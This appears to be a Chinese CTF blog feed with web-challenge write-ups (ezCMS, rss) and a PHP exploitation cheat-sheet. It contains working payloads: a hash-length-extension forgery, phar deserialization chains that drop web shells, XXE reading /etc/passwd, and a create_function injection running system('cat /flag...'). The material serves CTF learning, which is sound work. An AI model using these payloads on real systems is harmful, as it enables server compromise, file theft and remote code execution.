[&quot;n_sep_by_space&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]=&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>pos() 函数是current函数的别名</p>
</li>
<li><p>time() 返回时间戳整数, 从中无法提出点号</p>
</li>
<li><p>localtime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值</p>
</li>
<li><p>localtime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行</p>
</li>
</ul>
<h2 id="ezCMS"><a href="#ezCMS" class="headerlink" title="ezCMS"></a>ezCMS</h2><p>源码<code>www.zip</code>, 关键代码如下:</p>
<p>身份验证部分</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function login()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;));</span><br><span class="line">    return 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function is_admin()&#123;</span><br><span class="line">    $secret = &quot;********&quot;;</span><br><span class="line">    $username = $_SESSION[&apos;username&apos;];</span><br><span class="line">    $password = $_SESSION[&apos;password&apos;];</span><br><span class="line">    if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;)&#123;</span><br><span class="line">        if ($_COOKIE[&apos;user&apos;] === md5($secret.$username.$password))&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以明显看出这里有哈希长度扩展攻击.</p>
<p>哈希生成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./hash_extender -d &apos;admin&apos; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a &apos;ch4ser&apos; --out-data-format=html -l 13 --quiet</span><br></pre></td></tr></table></figure>

<p>得到了新的哈希值,添加到cookie[user]中</p>
<p>然后新的登录用户名: admin</p>
<p>用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch4ser</p>
<p>第二部分反序列化代码审计.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $black_list = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($content, $v) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"your file make me scare"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">        $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">        $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_dir = <span class="string">'sandbox/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!is_file(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>))&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>, <span class="string">'lolololol, i control all'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = $size;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_tmp = $file_tmp;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Check(<span class="keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">        $profile = <span class="keyword">new</span> Profile();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'u r not admin'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check -&gt; check();</span><br><span class="line">        $tmp = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $ext = end($tmp);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"your file is too big"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        move_uploaded_file(<span class="keyword">$this</span>-&gt;file_tmp, <span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.'</span>.$ext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">        $secret = <span class="string">"********"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.<span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用链:</p>
<ul>
<li>上传exp.phar</li>
<li>绕过waf使用<code>php://filter/read=convert.base64-encode/resource=phar://exp.phar</code>触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数</li>
<li>profile-&gt;admin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了</li>
</ul>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Admin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $file_error;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> File();</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>shell.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>

<h2 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h2><p>data protocol format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>

<p>说是php对mine type不敏感, 那么可以这样子写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://baidu.com/plain;base64,xxxxxxxxx==</span><br></pre></td></tr></table></figure>

<p>然后看rss的定义:</p>
<blockquote>
<p>What is RSS?</p>
<p>It is a format to share data, defined in the <a href="https://www.xul.fr/en-xml.php" target="_blank" rel="noopener">1.0 version</a> of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed.<br>Recent browsers can read directly RSS files, but a special <strong>RSS reader</strong> or <strong>aggregator</strong> may be used too.</p>
</blockquote>
<p>所以所谓的rss就是xml.</p>
<p>尝试测试</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上述内容base64编码之后用之前的data协议传入进去, 触发成功.</p>
<p>接下来就读取源码就行了.</p>
<p>不熟悉MVC架构….读完index.php之后就不知道读什么…..</p>
<p>index.php 中有routes.php, 根据routes.php再去读controllers/Admin.php, 然后又去读views/Admin.php</p>
<p>然后关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usort($data, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));</span><br></pre></td></tr></table></figure>

<p>直接拼接</p>
<p>exp.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml&amp;order=%24b%2C%24a)%3B%7Dsystem('cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134')%3B%2F%2F" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$b,$a);&#125;system(&apos;cat /flag_eb8ba2eb07702e69963a7d6ab8669134&apos;);&quot;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>备忘录[working]</title>
    <url>/2019/09/07/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="php语言相关"><a href="#php语言相关" class="headerlink" title="php语言相关"></a>php语言相关</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><blockquote>
<p>如果是要通过url参数方法传入的话, 要求allow_url_include=On</p>
</blockquote>
<p>php://input</p>
<p>php://filter/read=convert.base64-encode/resource=index.php</p>
<p>php://test.zip/phpinfo.txt</p>
<p>phpinfo.txt 里面是要执行的代码, 压缩到test.zip中.</p>
<p>zip:///var/www/html/test.zip%23phpinfo.txt</p>
<blockquote>
<p>接下来的协议要求allow_url_fopen allow_url_include = On</p>
</blockquote>
<p>data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</p>
<h2 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h2><p>常用绕过方式：使用php伪协议绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter/resource=phar://exp.phar</span><br></pre></td></tr></table></figure>

<p>payload产生方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//目标payload对象</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    @unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"exp.phar"</span>);</span><br><span class="line">	$phar -&gt; startBuffering();</span><br><span class="line">	$phar -&gt; setStub(<span class="string">'GIF89a'</span>,<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">	$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">	$object = <span class="keyword">new</span> Payload();</span><br><span class="line">	$phar -&gt; setMetadata($object);</span><br><span class="line">	$phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>  触发phar反序列化的方法：</p>
<ul>
<li>mime_content_type(‘phar://exp.phar’);</li>
<li>finfo_file</li>
<li><img src="https://user-images.githubusercontent.com/40637063/65428668-5add2f00-de47-11e9-9d59-e2c695b14d4e.png" alt="image"></li>
</ul>
<h2 id="基于phar的-pclzip"><a href="#基于phar的-pclzip" class="headerlink" title="基于phar的 pclzip"></a>基于phar的 pclzip</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class">前台注⼊</span></span><br><span class="line"><span class="class">后台<span class="title">phar</span>反序列化</span></span><br><span class="line"><span class="class">1</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">// ----- Filename of the zip file</span></span><br><span class="line"><span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ----- File descriptor of the zip file</span></span><br><span class="line"><span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// ----- Internal error handling</span></span><br><span class="line"><span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ----- Current status of the magic_quotes_runtime</span></span><br><span class="line"><span class="comment">// This value store the php configuration for</span></span><br><span class="line">magic_quotes</span><br><span class="line"><span class="comment">// The class can then disable the magic_quotes and</span></span><br><span class="line">reset it after</span><br><span class="line"><span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line"><span class="keyword">var</span> $save_path;</span><br><span class="line"><span class="comment">// ----------------------------------------------------</span></span><br><span class="line">----------------------------</span><br><span class="line"><span class="comment">// Function : PclZip()</span></span><br><span class="line"><span class="comment">// Description :</span></span><br><span class="line"><span class="comment">// Creates a PclZip object and set the name of the</span></span><br><span class="line">associated Zip archive</span><br><span class="line"><span class="comment">// filename.</span></span><br><span class="line"><span class="comment">// Note that no real action is taken, if the archive</span></span><br><span class="line">does not exist it is not</span><br><span class="line"><span class="number">2</span></span><br><span class="line"> <span class="comment">// created. Use create() for that.</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------</span></span><br><span class="line">----------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__,</span></span><br><span class="line"><span class="keyword">__LINE__</span>, <span class="string">'PclZip::PclZip'</span>, <span class="string">"zipname=$p_zipname"</span>);</span><br><span class="line"><span class="comment">// ----- Tests the zlib</span></span><br><span class="line"><span class="comment">// ----- Set the attributes</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line"><span class="comment">// ----- Return</span></span><br><span class="line"><span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__,</span></span><br><span class="line"><span class="keyword">__LINE__</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// the shell.zip contains shell.php</span></span><br><span class="line"><span class="comment">// and the pclzip will unzip the shell.zip</span></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/shell.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data/'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="number">3</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，</span></span><br><span class="line">增加gif⽂文件头⽤用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将⾃自定义meta-data存⼊入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的⽂文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过phar协议来触发pclzip的反序列化就可以unzip shell.zip文件释放其中的shell</p>
<h2 id="本地ip-伪造"><a href="#本地ip-伪造" class="headerlink" title="本地ip 伪造"></a>本地ip 伪造</h2><ul>
<li>X-Forwarded-For</li>
<li>X-Client-IP</li>
</ul>
<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>可以绕过</p>
<ul>
<li>preg_match</li>
<li>长度限制</li>
</ul>
<h2 id="php-变量覆盖"><a href="#php-变量覆盖" class="headerlink" title="php 变量覆盖"></a>php 变量覆盖</h2><p>parse_str 使用不当造成的变量覆盖问题</p>
